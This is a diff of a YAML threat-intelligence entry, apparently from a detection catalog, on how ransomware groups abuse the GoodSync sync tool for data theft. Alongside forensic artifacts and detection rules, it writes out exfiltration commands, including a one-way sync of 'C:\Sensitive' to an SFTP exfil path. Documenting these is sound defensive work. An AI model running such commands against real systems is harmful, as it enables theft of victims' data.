@@ -1,9 +1,10 @@
 Name: GoodSync
 Description: >
-  Commercial file synchronization and backup tool supporting local-to-remote and cloud-based
-  transfers. GoodSync offers GUI and CLI execution, can run scheduled or silent sync tasks,
-  and has been abused by ransomware operators to exfiltrate large volumes of data to
-  attacker-controlled cloud storage such as Backblaze, Google Drive, or SFTP servers.
+  Commercial file synchronization and backup tool supporting local, network, and cloud-based transfers.
+  GoodSync provides both GUI and CLI execution, persistent sync jobs, and automated background operation.
+  Threat actors, particularly ransomware groups, have abused GoodSync to exfiltrate large volumes of data
+  by configuring one-way sync jobs to attacker-controlled cloud storage or SFTP servers, allowing data
+  theft to blend in with legitimate backup or synchronization activity.
 Category: third-party
 Platform:
   - Windows
@@ -17,103 +18,104 @@ Capabilities:
   - recursive-upload       # Sync jobs can recursively upload entire directory trees.
   - cloud-upload           # Supports multiple cloud backends (Backblaze, Google Drive, OneDrive, S3-compatible).
   - sftp-upload            # Exfiltration via SFTP endpoints controlled by the attacker.
-  - file-filtering         # Include/exclude rules to target specific file types or recently modified files.
+  - file-filtering         # Include/exclude rules to target specific file types or modified data.
   - scheduled-execution    # Automated sync jobs that run periodically without user interaction.
   - quiet-execution        # Sync tasks can run silently with minimal GUI evidence.
-  - background-execution   # Jobs run in the background once configured; no active user session required.
-  - credential-storage     # GoodSync stores hashed/encoded credentials in TIC files.
-  - persistent-jobs        # Sync jobs are saved as persistent configuration files (TIC).
+  - background-execution   # Jobs execute in background via GoodSync service/engine.
+  - credential-storage     # Encoded credentials stored in GoodSync TIC configuration files.
+  - persistent-jobs        # Sync jobs persist across reboots via saved TIC job definitions.
 Forensics:
   BinaryLocations:
-    - "C:\\Program Files\\GoodSync\\GoodSync.exe"
-    - "C:\\Program Files\\GoodSync\\gsync.exe"
-    - "/usr/bin/gsync"
-    - "/usr/local/bin/gsync"
+    - C:\Program Files\GoodSync\GoodSync.exe
+    - C:\Program Files\GoodSync\gsync.exe
+    - /usr/bin/gsync
+    - /usr/local/bin/gsync
   FileNamePatterns:
-    - GoodSync\.exe
-    - gsync\.exe
-    - GoodSync-.+\.log
+    - GoodSync.exe
+    - gsync.exe
+    - GoodSync.log
   CommandLineArgs:
-    Description: These flags and patterns have been observed in malicious exfiltration scenarios.
+    Description: Command-line options commonly observed in malicious GoodSync-based exfiltration.
     Indicators:
       - gsync sync            # CLI-driven sync operation used for silent bulk exfiltration.
-      - /analyse              # Scans directories before sync; used by actors to preview files.
-      - /dir                  # Specifies the sync job directory (source/target pair).
-      - /exclude              # Excludes large/unwanted files; reduces noise and volume.
-      - /include              # Targets specific formats (.pdf, .docx, .csv) for selective exfiltration.
-      - /oneway               # Ensures local → remote upload without receiving files.
-      - /contact              # Specifies remote storage endpoint definitions.
-  NetworkArtifacts:
-    Description: Traffic patterns and destinations associated with GoodSync remote sync.
-    Indicators:
-      - "*.backblaze.com"
-      - "api.backblazeb2.com"
-      - "drive.google.com"
-      - "*.onedrive.com"
-      - "sftp://<attacker-ip>/"
-      - "webdav://<domain>/"
+      - /analyse              # Directory scan prior to sync; previews data volume.
+      - /dir                  # Specifies source/target sync job directory.
+      - /exclude              # Skips large or irrelevant files to reduce noise.
+      - /include              # Targets specific formats (.pdf, .docx, .csv).
+      - /oneway               # Enforces local-to-remote uploads only.
+      - /contact              # References predefined remote storage endpoints.
   ConfigFiles:
-    - "%AppData%\\Local\\GoodSync\\server-accounts.tic"
-    - "%AppData%\\Local\\GoodSync\\GsAcct.tic"
-    - "%AppData%\\Local\\GoodSync\\jobs-groups-options-*.tic"
-    - "%AppData%\\Local\\GoodSync\\GoogleDriveCache\\google-fs-cache.tic"
+    - %AppData%\Local\GoodSync\server-accounts.tic
+    - %AppData%\Local\GoodSync\GsAcct.tic
+    - %AppData%\Local\GoodSync\jobs-groups-options-*.tic
+    - %AppData%\Local\GoodSync\GoogleDriveCache\google-fs-cache.tic
   RegistryPersistence:
-    - "HKCU\\Software\\GoodSync"
-    - "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\GoodSync*"
+    - HKCU\Software\GoodSync
+    - HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\GoodSync
   LogFiles:
-    - "%AppData%\\Local\\GoodSync\\log\\GoodSync-YYYYMMDD-HHmm.log"
-  ScheduledTask: []  # GoodSync can create jobs internally, not as Windows scheduled tasks unless misused.
+    - %AppData%\Local\GoodSync\log\GoodSync-YYYYMMDD-HHmm.log
+NetworkArtifacts:
+  Description: >
+    GoodSync generates outbound connections to cloud storage providers or remote servers
+    defined in sync job configurations. Because destinations depend on user-selected
+    backends (cloud or SFTP), network indicators alone are insufficient for reliable
+    detection without endpoint or configuration context.
+  ScheduledTask: []
+NetworkBehavior:
+  Description: >
+    GoodSync abuse is characterized by persistent background synchronization of large directory
+    trees to remote destinations. Threat actors commonly configure one-way sync jobs that repeatedly
+    upload new or modified files, allowing exfiltration to continue over extended periods while
+    appearing similar to legitimate backup activity.
+  Behaviors:
+    - Repeated outbound uploads to cloud or SFTP endpoints over HTTPS or SSH
+    - Long-lived background processes executing without user interaction
+    - One-way synchronization patterns with no inbound file activity
+    - Gradual or bulk transfer of large datasets
 ThreatActors:
   - ransomware
 UseCases:
   - Title: Bulk directory exfiltration to cloud storage
     Description: >
-      Threat actors configure a GoodSync sync job pointing to Backblaze or other cloud storage,
-      recursively uploading hundreds of gigabytes of victim data. Observed in Chaos and 3AM ransomware.
+      Threat actors configure a GoodSync job targeting cloud storage to recursively upload
+      large volumes of victim data. Observed in Chaos and 3AM ransomware campaigns.
     Command: gsync sync /dir "C:\Data" /oneway /contact backblaze-profile
   - Title: Silent CLI-based exfiltration
     Description: >
-      Uses `gsync.exe` instead of the GUI, allowing entirely silent execution and easier scripting
-      via loaders or remote shells.
+      gsync.exe used instead of the GUI to enable silent, script-driven execution via remote shells.
     Command: gsync sync /dir "/home/user/Documents" /oneway
-  - Title: Targeted exfiltration via filtering
+  - Title: Targeted exfiltration using filters
     Description: >
-      Attackers apply include/exclude rules to extract only valuable data types and reduce detection
-      by avoiding unnecessary uploads.
+      Include/exclude rules restrict uploads to high-value file types to reduce noise.
     Command: gsync sync /dir "C:\Users\Admin" /include="*.pdf" /exclude="*.iso"
-  - Title: SFTP-based exfiltration to attacker infrastructure
+  - Title: SFTP-based exfiltration
     Description: >
-      Sync job configured to upload data to an attacker-controlled SFTP server, evading cloud-focused
-      detections and making domain/IP attribution more difficult.
+      Sync job uploads data to attacker-controlled SFTP infrastructure, bypassing cloud-specific monitoring.
     Command: gsync sync /dir "C:\Sensitive" /contact "sftp://192.168.1.10/exfil/"
-  - Title: Automated persistent sync job
+  - Title: Persistent automated sync job
     Description: >
-      A GoodSync job saved in TIC configuration runs regularly, exfiltrating new or modified files
-      without manual execution.
-    Command: N/A  # Triggered by internal scheduled sync engine
+      Saved GoodSync job continuously exfiltrates newly created or modified files.
+    Command: N/A
 Detection:
   - Type: Suspicious Sync Job Creation
     Description: >
-      Detect creation or modification of GoodSync TIC files referencing new cloud or SFTP accounts,
-      especially on systems where GoodSync is not typically used.
-  - Type: CLI Execution from Unusual Parents
+      Detect creation or modification of GoodSync TIC files referencing new cloud or SFTP accounts
+      on systems where GoodSync is uncommon.
+  - Type: CLI Execution from Unusual Parent
     Description: >
-      Alert when gsync.exe is spawned by PowerShell, mshta, wscript, psexec, or remote execution tools.
-  - Type: Large Outbound Transfers to Cloud Storage
+      Alert when gsync.exe is spawned by PowerShell, wscript, mshta, psexec, or remote execution tools.
+  - Type: Large Outbound Transfers
     Description: >
-      Monitor high-volume uploads to Backblaze, Google Drive, or uncommon S3-compatible endpoints
-      originating from servers or desktops that do not normally perform backups.
-  - Type: Silent Background Syncing
+      Monitor high-volume uploads to cloud storage services originating from non-backup systems.
+  - Type: Silent Background Sync
     Description: >
-      Detect gsync.exe executing without GUI interaction, especially combined with `/oneway` or filtering flags.
-  - Type: Exfiltration via SFTP/WebDAV
+      Detect gsync.exe running without GUI interaction combined with /oneway or filtering flags.
+  - Type: Non-Standard SFTP Usage
     Description: >
-      Unusual outbound SFTP/WebDAV connections from non-backup systems can indicate malicious usage.
-Testing:
-  - https://www.synacktiv.com/en/publications/legitimate-exfiltration-tools-summary-and-detection-for-incident-response-and-threat
+      Flag outbound SFTP connections from endpoints not designated for backup or data transfer.
 References:
   - https://blog.talosintelligence.com/new-chaos-ransomware/
   - https://news.sophos.com/en-us/2025/05/20/a-familiar-playbook-with-a-twist-3am-ransomware-actors/
   - https://thehackernews.com/2025/07/chaos-raas-emerges-after-blacksuit.html
   - https://www.synacktiv.com/en/publications/legitimate-exfiltration-tools-summary-and-detection-for-incident-response-and-threat
-LastModified: '2025-11-19'
+LastModified: '2025-12-12'
